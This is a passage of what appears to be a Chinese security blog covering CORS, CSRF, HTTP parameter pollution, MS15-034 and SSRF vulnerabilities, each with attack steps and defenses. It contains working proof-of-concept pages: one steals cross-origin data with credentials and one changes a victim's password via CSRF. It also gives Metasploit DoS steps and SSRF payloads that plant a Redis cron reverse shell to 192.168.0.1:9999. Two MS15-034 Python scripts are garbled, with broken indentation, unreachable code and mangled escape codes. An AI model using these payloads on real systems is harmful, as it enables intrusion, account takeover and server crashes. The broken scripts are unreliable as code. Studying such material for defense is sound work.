<h3 id="缺少-Vary-Origin头"><a href="#缺少-Vary-Origin头" class="headerlink" title="缺少 Vary:Origin头"></a>缺少 Vary:Origin头</h3><p>　　当资源服务器需要共享多个域名时，它需要每个不同请求域的跨域请求生成不同的访问控制策略。但一旦这个资源内容需要被缓存，则会带来 CORS 失效问题。例如，<code>c.com</code>同时允许<code>a.com</code>和<code>b.com</code>共享。<code>c.com</code> 资源内容首先被<code>a.com</code> 脚本跨域访问后被缓存，其中缓存响应头为<code>Access-Control-Allow-Origin: http://a.com”</code>。这时，b.com脚本则不能读取缓存响应内容，因为缓存响应头是允许<code>a.com</code>共享，而不是<code>b.com</code>。</p>
<p>　　HTTP协议提供了Vary头，用于解决这种情况，资源服务器需要在响应头中配置<code>Vary:Origin</code>头来指导缓存，为每个不同的Origin头缓存一份不同的内容。</p>
<h2 id="CORS-漏洞发现"><a href="#CORS-漏洞发现" class="headerlink" title="CORS 漏洞发现"></a>CORS 漏洞发现</h2><p>使用curl工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -I https://www.a.com -H &quot;Origin: https://test.com&quot;</span><br></pre></td></tr></table></figure>

<p>burp suite抓包修改头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET https://www.a.com/api/index.php</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.test.com</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>www.test.com</span><br></pre></td></tr></table></figure>

<p>CORScanner批量检测工具</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://github.com/chenjj/CORScanner</span><br></pre></td></tr></table></figure>

<p>用法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cors_scan.py -vv -u https://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>　　通过分析工具源码，可以知道其检测漏洞的逻辑，发现其为变换请求头的origin字段，如果返回包中的<code>access-control-allow-origin</code>内容和发送的origin头内容相同，则存在此问题。</p>
<p>以检测<code>http://www.vuln.com/a.php</code>为例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反射Origin头</span><br><span class="line">发送origin头为http://evil.com</span><br><span class="line"></span><br><span class="line">是否只匹配前置域名</span><br><span class="line">发送origin头为http://www.vuln.com.evil.com</span><br><span class="line"></span><br><span class="line">是否只匹配后置域名</span><br><span class="line">发送origin头为http://evilvuln.com</span><br><span class="line"></span><br><span class="line">是否信任null</span><br><span class="line">发送origin头为null</span><br><span class="line"></span><br><span class="line">是否包含匹配</span><br><span class="line">发送origin头为http://uln.com</span><br><span class="line"></span><br><span class="line">是否没有转义.</span><br><span class="line">http://www.vulnacom</span><br><span class="line"></span><br><span class="line">是否信任自定义url        </span><br><span class="line">发送的origin位于根目录下的origins.json</span><br><span class="line">https://whatever.github.io</span><br><span class="line">http://jsbin.com</span><br><span class="line">htps://codepen.io</span><br><span class="line">https://jsfiddle.net</span><br><span class="line">http://www.webdevout.net</span><br><span class="line">https://repl.it</span><br><span class="line"></span><br><span class="line">是否信任任意子域名</span><br><span class="line">http://evil.www.vuln.com</span><br><span class="line"></span><br><span class="line">https是否信任http（此检测为http，故忽略）</span><br><span class="line">origin为将https替换为http</span><br></pre></td></tr></table></figure>

<p>　　但是发现了一个问题，就是其没有解析泛域名的问题，也就是配置了<code>access-control-allow-origin</code>为*的安全问题，虽然这个配置不能被漏洞所利用</p>
<p>这份源码加上了这个功能</p>
<p><a href="https://github.com/saucer-man/CORScanner">https://github.com/saucer-man/CORScanner</a></p>
<p><a href="https://github.com/saucer-man/CORScanner/commit/3af8499c8860e203f1d3264f287c19d047fafd93">https://github.com/saucer-man/CORScanner/commit/3af8499c8860e203f1d3264f287c19d047fafd93</a></p>
<h2 id="CORS-漏洞利用POC"><a href="#CORS-漏洞利用POC" class="headerlink" title="CORS 漏洞利用POC"></a>CORS 漏洞利用POC</h2><p>当A网站设置<code>Access-Control-Allow-Origin: null</code>的时候，B站能够读取A站的敏感数据。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>CORS POC Exploit<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Extract SID<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;cors()&quot;</span>&gt;</span>Exploit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">cors</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">	xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">if</span> (<span class="built_in">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML = alert(<span class="built_in">this</span>.responseText);</span></span><br><span class="line"><span class="javascript">		&#125;</span></span><br><span class="line"><span class="javascript">	&#125;;</span></span><br><span class="line"><span class="javascript">	xhttp.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://target.com/info/&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">	xhttp.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">	xhttp.send();</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="CORS-漏洞防御措施"><a href="#CORS-漏洞防御措施" class="headerlink" title="CORS 漏洞防御措施"></a>CORS 漏洞防御措施</h2><ol>
<li><p>不要盲目反射 Origin头</p>
</li>
<li><p>严格校验 Origin 头，避免出现权限泄露</p>
</li>
<li><p>不要配置 <code>Access-Control-Allow-Origin: null</code></p>
</li>
<li><p>HTTPS 网站不要信任HTTP 域</p>
</li>
<li><p>不要信任全部自身子域，减少攻击面</p>
</li>
<li><p>不要配置 <code>Origin:*</code>和 <code>Credentials: true</code></p>
</li>
<li><p>增加 <code>Vary: Origin</code> 头</p>
</li>
</ol>
<h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p><a href="https://www.jianjunchen.com/post/cors%E5%AE%89%E5%85%A8%E9%83%A8%E7%BD%B2%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#2-6-origin-%E4%B8%8E-credentials-true-%E5%85%B1%E7%94%A8">绕过浏览器SOP，跨站窃取信息：CORS配置安全漏洞报告及最佳部署实践</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/83099266">CORS介绍及其漏洞检测</a></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>CORS</category>
      </categories>
      <tags>
        <tag>跨域漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF跨站请求伪造漏洞</title>
    <url>//44b9cec07681.html</url>
    <content><![CDATA[<h2 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h2><p>简单来说就是盗用用户的身份，以用户的身份发送恶意请求</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>网站的<code>cookie</code>在浏览器中不会过期，只要不关闭浏览器或者退出登录，以后访问这个网站，都会默认用户是登录状态</p>
<ul>
<li>用户C打开浏览器，访问受信任网站A，并登录网站A</li>
<li>在用户成功登录网站A后，网站A产生<code>cookie</code>信息返回给浏览器，浏览器保存在本地</li>
<li>在用户未退出网站A之前，在同一浏览器中，新打开一个标签访问网站B</li>
<li>网站B接收到用户C的请求后，返回恶意代码，并发出一个请求访问第三方网站A</li>
<li>浏览器接到网站B的请求，在用户不知情的情况下携带<code>cookie</code>，向网站A发送请求，以用户C的<code>cookie</code>和权限执行恶意请求</li>
</ul>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>当已经登陆的用户所做的所有修改操作，都可以被CSRF漏洞利用</p>
<p>抓取一个登录之后的请求包，如果HTTP头部里面不包含Referer字段和token，那么可能存在CSRF漏洞</p>
<p>如果有Referer字段，但是去掉Referer之后再重新提交，如果该提交有效，那么可能存在CSRF漏洞</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>构造带有恶意代码的网站B</p>
<p>下面代码中访问了目标网站A，并提交了POST请求，修改了新的密码</p>
<p>只要诱导用户访问网站B，并且网站A在登录状态，即可通过此代码将用户在网站A的密码改成我们设置好的密码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=222&amp;password_conf=222&amp;Change=Change#&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1.png&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p><strong>在请求中添加token并验证</strong></p>
<p>在请求中放入攻击者不能伪造的信息，并且该信息不在cookie中，开发者可以在http请求中以参数的形式加入一个随机产生的token，并且在服务器建立一个拦截器来验证这个token。如果请求中没有token或者token中内容不正确的话，表示可能是攻击者发动的攻击。</p>
<p><strong>验证HTTP Referer字段</strong></p>
<p>http头中有一个referer，记录http请求的来源地址，访问一个安全受限的页面的请求必须来自同一个网站。当用户要提交一个请求时，请求的referer值需是提交按钮（触发请求）所在的页面的URL。</p>
<p><strong>添加验证码</strong></p>
<p>每次用户提交都在表单上填写一个图片上的随机字符串作为验证码</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>跨域漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>HPP参数污染漏洞</title>
    <url>//4189faf9a367.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>浏览器在跟服务器进行交互的过程中，浏览器往往会在GET/POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="https://www.baidu.com/s?wd=aa&amp;wd=bb">https://www.baidu.com/s?wd=aa&amp;wd=bb</a> ，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是wd=aa。有的服务器是取第二个参数，也就是wd=bb。有的服务器两个参数都取，也就是wd=aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>以百度为例，当我们提交两个或两个以上的参数时，返回第一个参数的结果</p>
<p><a href="https://www.baidu.com/s?wd=1&amp;wd=2">https://www.baidu.com/s?wd=1&amp;wd=2</a></p>
<p>以必应为例，当我们提交两个或两个以上的参数时，返回第最后一个参数的结果</p>
<p><a href="https://cn.bing.com/search?q=1&amp;q=2">https://cn.bing.com/search?q=1&amp;q=2</a></p>
<p>以Google为例，当我们提交两个或两个以上的参数时，返回全部参数的结果，参数之间以空格相隔</p>
<p><a href="https://www.google.com.hk/search?q=1&amp;q=2">https://www.google.com.hk/search?q=1&amp;q=2</a></p>
<table>
<thead>
<tr>
<th align="center">web服务器</th>
<th align="center">获取参数函数</th>
<th align="center">获取到的参数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">PHP/Apache</td>
<td align="center">$_GET(“test”)</td>
<td align="center">last</td>
</tr>
<tr>
<td align="center">JSP/Tomcat</td>
<td align="center">Request.getParameter(“test”)</td>
<td align="center">first</td>
</tr>
<tr>
<td align="center">Perl(CGI)/Apache</td>
<td align="center">Param(“test”)</td>
<td align="center">first</td>
</tr>
<tr>
<td align="center">Python/Apache</td>
<td align="center">getvalue(“test”)</td>
<td align="center">ALL</td>
</tr>
<tr>
<td align="center">ASP/IIS</td>
<td align="center">Request.QueryString(“test”)</td>
<td align="center">ALL</td>
</tr>
</tbody></table>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞可以用于逻辑漏洞，可以造成IDOR，信息泄露，越权等漏洞</p>
<p>该漏洞是注入型漏洞，可以作为其他漏洞的辅助，也可以用于绕过漏洞的检测和WAF等</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>HPP</category>
      </categories>
      <tags>
        <tag>访问控制错误漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
    <url>//2e5ad9caf81d.html</url>
    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>



<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes=0-18446744073709551615&quot; http://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>

<p>如果服务器打上了补丁，那么响应状态应该是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary/scanner/http/ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary/dos/http/ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>



<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>远程代码执行漏洞</category>
      </categories>
      <tags>
        <tag>远程代码执行漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF服务端请求伪造漏洞</title>
    <url>//239b0b1943ac.html</url>
    <content><![CDATA[<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><p>SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由<code>攻击者构造</code>形成由<code>服务端发起请求</code>的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤限制。</p>
<p>SSRF<strong>利用存在缺陷的Web应用作为代理攻击远程和本地的服务器</strong>。</p>
<p><strong>PHP使用的协议</strong></p>
<table>
<thead>
<tr>
<th align="center">协议</th>
<th align="center">说明</th>
<th align="center">格式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">http</td>
<td align="center">web端口访问</td>
<td align="center">url=<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></td>
</tr>
<tr>
<td align="center">https</td>
<td align="center">web端口访问</td>
<td align="center">url=<a href="https://127.0.0.1:8080/">https://127.0.0.1:8080</a></td>
</tr>
<tr>
<td align="center">file</td>
<td align="center">本地文件传输</td>
<td align="center">url=file:///C:/windows/win.ini</td>
</tr>
<tr>
<td align="center">dict</td>
<td align="center">字典协议</td>
<td align="center">url=dict://127.0.0.1:3306</td>
</tr>
<tr>
<td align="center">sftp</td>
<td align="center">SSH文件传输协议</td>
<td align="center">url=s<a href="ftp://test.com:9999/">ftp://test.com:9999/</a> nc -lvp  9999</td>
</tr>
<tr>
<td align="center">tftp</td>
<td align="center">文件传输协议</td>
<td align="center">url=t<a href="ftp://test.com:9999/TESTUDPPACKET">ftp://test.com:9999/TESTUDPPACKET</a> nc -lvp  9999</td>
</tr>
<tr>
<td align="center">ldap</td>
<td align="center">目录访问协议</td>
<td align="center">url=ldap://test.com:9999/%0astats%0aquit nc -lvp  9999</td>
</tr>
<tr>
<td align="center">gopher</td>
<td align="center">分布式文档传递</td>
<td align="center">url=gopher://test.com:9999/_abc nc -lvp  9999</td>
</tr>
</tbody></table>
<p><strong>Java使用的协议</strong></p>
<table>
<thead>
<tr>
<th align="center">协议</th>
<th align="center">说明</th>
<th align="center">格式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">http</td>
<td align="center">web端口访问</td>
<td align="center">url=<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></td>
</tr>
<tr>
<td align="center">https</td>
<td align="center">web端口访问</td>
<td align="center">url=<a href="https://127.0.0.1:8080/">https://127.0.0.1:8080</a></td>
</tr>
<tr>
<td align="center">file</td>
<td align="center">本地文件传输</td>
<td align="center">url=file:///C:/windows/win.ini</td>
</tr>
<tr>
<td align="center">ftp</td>
<td align="center">文件传输协议</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">mailto</td>
<td align="center">邮件协议</td>
<td align="center">url=mailto:<a href="mailto:&#120;&#x78;&#x78;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#x6d;">&#120;&#x78;&#x78;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#x6d;</a>?cc=xxx&amp;body=hello</td>
</tr>
<tr>
<td align="center">netdoc</td>
<td align="center">java自定义通信协议</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">jar</td>
<td align="center">远程解压</td>
<td align="center"></td>
</tr>
</tbody></table>
<p>HTTP,HTTPS协议</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?url=http://127.0.0.1:8080</span><br><span class="line"># 在redis写入shell</span><br><span class="line">url=http://127.0.0.1:6379/test</span><br><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.1/9999 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>

<p>FILE协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=file:///C:/windows/win.ini</span><br></pre></td></tr></table></figure>

<p>DICT协议</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?url=dict://127.0.0.1:3306</span><br><span class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line"># dict在redis写入shell,需要对命令进行16进制编码</span><br><span class="line">?url=dict://127.0.0.1:6379/set:shell:&quot;\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.1/9999 0&gt;&amp;1\n\n&quot;</span><br><span class="line">?url=dict://127.0.0.1:6379/config:set:dir:/etc/</span><br><span class="line">?url=dict://127.0.0.1:6379/config:set:dbfilename:crontab</span><br><span class="line">?url=dict://127.0.0.1:6379/bgsave</span><br></pre></td></tr></table></figure>

<p>gopher协议</p>
<p>在url中需要二次编码</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?url=gopher://test.com:9999/_abc</span><br><span class="line">test.com:$ nc -lvp 22</span><br></pre></td></tr></table></figure>

<p>gopher协议通过redis写入shell</p>
<p>在url中需要二次编码</p>
